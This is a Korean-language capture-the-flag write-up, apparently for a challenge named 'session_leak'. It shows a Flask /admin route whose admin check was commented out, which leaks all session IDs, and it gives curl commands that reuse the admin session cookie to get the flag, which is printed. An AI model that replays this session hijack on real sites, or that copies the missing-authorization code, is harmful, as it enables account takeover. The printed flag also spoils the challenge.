## session_leak

> 문제 설명: 로그인 시 서버 메모리의 `session_storage` 딕셔너리에 `{session_id: username}` 형태로 세션이 저장되고, 쿠키의 `sessionid`로 로그인 상태를 판별하는 웹 문제입니다. `admin` 계정은 비밀번호를 알 수 없고, 세션 ID도 브루트포싱이 불가능하도록 되어 있습니다.

### **취약점: 인가 로직 누락 (Broken Access Control)**

```python
@app.route('/admin')
def admin():
    # developer's note: review below commented code and uncomment it (TODO)

    #session_id = request.cookies.get('sessionid', None)
    #username = session_storage[session_id]
    #if username != 'admin':
    #    return render_template('index.html')

    return session_storage
```

`/admin` 라우트는 원래 admin 권한을 검증한 뒤 접근을 제한해야 하지만, 개발자가 해당 검증 코드를 **주석 처리한 채 배포**했습니다. 그 결과 `/admin`에 접근하기만 하면 인증 없이 서버의 `session_storage` 전체가 그대로 노출됩니다.

```python
session_storage[os.urandom(32).hex()] = 'admin'
```

서버 시작 시 admin의 session_id가 미리 `session_storage`에 저장되어 있으므로, `/admin`에서 이 딕셔너리를 그대로 읽으면 **admin의 session_id를 비밀번호 없이, 브루트포싱 없이 즉시 획득**할 수 있습니다.

### Solve 😈

**1) `/admin`에 접속하여 session_storage 내용 확인**

```bash
curl http://host:port/admin
```

```json
{ "a1b2c3...": "guest", "f9e8d7...": "admin" }
```

**2) admin의 session_id를 쿠키로 설정 후 `/` 접속**

```bash
curl http://host:port/ --cookie "sessionid=f9e8d7..."
```

**결과:**

```bash
Hello admin, flag is DH{8f3d86d1134c26fedf7c4c3ecd563aae3da98d5c}
```
